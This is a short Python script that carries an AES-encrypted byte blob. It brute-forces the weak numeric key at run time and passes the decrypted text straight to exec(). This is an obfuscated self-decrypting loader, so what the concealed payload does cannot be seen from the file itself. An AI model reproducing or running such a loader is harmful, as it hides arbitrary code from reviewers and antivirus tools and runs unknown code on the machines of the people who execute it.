from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import os
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b"V\xc6\x19\x00\x88\x03\xad'p\xf84\xfc\x03\xbc!\xe5\xf9\xe6\x92\x97\xa1\x07\x1a\xc9>&\xb1}\xd4`\xa31\xf5p\x1d\xfd\x84\xd6\xafR\x05\x1d\x9e\xc2\x1b\x08\xb6G:\x19\x15a\x1c\xbdx\xbdv\xa7\xc2\x0c\xe3\xd9#\x8cE-\xc9\x99\xbfQ\x0e\xd8,\xb4=\x06\x9c\xb4\xaaH\x90\xc7\x03\xd1\xd62\xe3~\xac\xbfQ\xf5\xaa\x8b\x8f\xfc\xcf\xa5\xba\xc1\xd7\x8b\xa6\xfd\x96\x81\xb3\xa7\x91:\x80;c\x87\xc5\x8d\x92\xe1\xb6@\r\x1fwH9\x13x\xfee\x9d\xa6&\x16\x82\xcd\xbe1\xaf\xcd\xf82?\xff\xf0>\x9f\xd5IKNY\xcb\xad,E]6A\xe6\x12\x85Cc\x90f\xf9\xb6\xfa\x01e\xf7\xd68\xe5\xba17\x8b\x1a\x9a\xb2M\xaajK\xe3\x0bb\xa6\x82i\x88"
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
